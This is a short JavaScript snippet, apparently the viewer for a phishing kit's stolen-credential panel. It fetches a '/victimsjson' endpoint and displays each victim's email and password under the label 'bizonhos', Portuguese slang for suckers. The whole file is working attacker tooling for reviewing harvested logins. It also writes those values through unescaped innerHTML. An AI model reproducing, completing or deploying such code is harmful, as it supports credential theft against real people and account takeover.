function bizonhosAddHtml(user, pass){
    let newBizonho = document.createElement("li");
    newBizonho.innerHTML = `<p>Email: <strong>${user}</strong> </p><p>Password: <strong>${pass}</strong> </p>`;

    document.getElementById("bizonhos").appendChild(newBizonho);
}

function getBizonhos(){
    fetch("/victimsjson")
    .then(response => response.json())
    .then(data => {
        console.log(data);
        for (let i = 0; i < data.victims.length; i++) {
            const bizonhos = data.victims[i];
            bizonhosAddHtml(bizonhos.username, bizonhos.password);
        }
    })
    .catch(error => console.error("Impossivel obter bizonhos!", error));
}